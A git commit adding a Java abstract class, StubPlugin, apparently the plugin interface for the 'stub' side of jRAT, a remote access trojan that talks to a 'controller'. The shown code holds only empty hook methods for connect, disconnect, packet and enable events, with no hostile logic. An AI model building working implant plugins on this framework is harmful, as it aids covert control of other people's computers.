efcec1cccea173dcca9c7e94aef17fbadfd78c6a
redpois0n <red@cmail.nu>
2013-06-19 11:19:09 +0200

    Commenting, changing name

---
+++ src/org/jrat/project/api/StubPlugin.java
@@ -0,0 +1,43 @@
+package org.jrat.project.api;
+
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+
+public abstract class StubPlugin {
+	
+	/**
+	 * 
+	 * @return The name of this plugin (Not needed)
+	 */
+	public String getName() {
+		return "Unknown";
+	}
+	
+	/**
+	 * When we loose connection to controller and the reason
+	 * @param ex
+	 * @throws Exception
+	 */
+	public abstract void onDisconnect(Exception ex) throws Exception;
+	
+	/**
+	 * When we connect
+	 * @param dis
+	 * @param dos
+	 * @throws Exception
+	 */
+	public abstract void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception;
+	
+	/**
+	 * Incoming packet, we get the header
+	 * @param header
+	 * @throws Exception
+	 */
+	public abstract void onPacket(byte header) throws Exception;
+	
+	/**
+	 * When the Stub starts
+	 * @throws Exception
+	 */
+	public abstract void onEnable() throws Exception;
+}
